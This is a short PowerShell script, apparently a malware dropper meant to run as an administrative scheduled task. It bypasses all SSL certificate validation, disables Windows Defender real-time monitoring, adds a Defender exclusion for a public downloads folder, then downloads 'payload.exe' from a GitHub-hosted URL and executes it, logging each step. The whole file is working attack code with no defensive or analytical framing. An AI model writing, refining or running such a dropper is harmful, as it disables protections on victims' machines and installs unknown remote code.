# This script runs with administrative privileges from a scheduled task.

# --- Step 0: Bypass All SSL Certificate Validation ---
if (-not ([System.Management.Automation.PSTypeName]'ServerCertificateValidationCallback').Type) {
    $certCallback = @"
using System;
using System.Net;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;
public class ServerCertificateValidationCallback {
    public static void Ignore() {
        if(ServicePointManager.ServerCertificateValidationCallback ==null) {
            ServicePointManager.ServerCertificateValidationCallback += delegate (
                Object obj, X509Certificate certificate, X509Chain chain,
                SslPolicyErrors errors) {
                return true;
            };
        }
    }
}
"@
    Add-Type $certCallback
}
[ServerCertificateValidationCallback]::Ignore()

# --- Step 1: Verify and create directory if needed ---
$downloadPath = "C:\Users\Public\Downloads"
if (-not (Test-Path $downloadPath)) {
    New-Item -ItemType Directory -Path $downloadPath -Force
}

# --- Step 2: Disable Windows Defender Real-time Monitoring (with better error handling) ---
try {
    Set-MpPreference -DisableRealtimeMonitoring $true -Force
    "Defender real-time monitoring disabled successfully" | Out-File "$downloadPath\script.log" -Append
} catch {
    "Failed to disable Defender real-time monitoring: $($_.Exception.Message)" | Out-File "$downloadPath\error.log" -Append
}

try {
    Add-MpPreference -ExclusionPath $downloadPath -Force
    "Defender exclusion added successfully" | Out-File "$downloadPath\script.log" -Append
} catch {
    "Failed to add Defender exclusion: $($_.Exception.Message)" | Out-File "$downloadPath\error.log" -Append
}

# --- Step 3: Download and Execute the Main Payload ---
$payloadURL = "https://raw.githubusercontent.com/serpiajonna-bit/hosting/main/payload.exe"
$savePath = "$downloadPath\payload.exe"

try {
    # Download with progress and error handling
    Invoke-WebRequest -Uri $payloadURL -OutFile $savePath -ErrorAction Stop
    "Payload downloaded successfully" | Out-File "$downloadPath\script.log" -Append
    
    # Verify file exists before execution
    if (Test-Path $savePath) {
        # Fixed the syntax error: removed backslash from -NoNewWindow
        Start-Process -FilePath $savePath -NoNewWindow -Wait
        "Payload executed successfully" | Out-File "$downloadPath\script.log" -Append
    } else {
        "Downloaded file not found at $savePath" | Out-File "$downloadPath\error.log" -Append
    }
} catch {
    "Download failed: $($_.Exception.Message)" | Out-File "$downloadPath\error.log" -Append
}
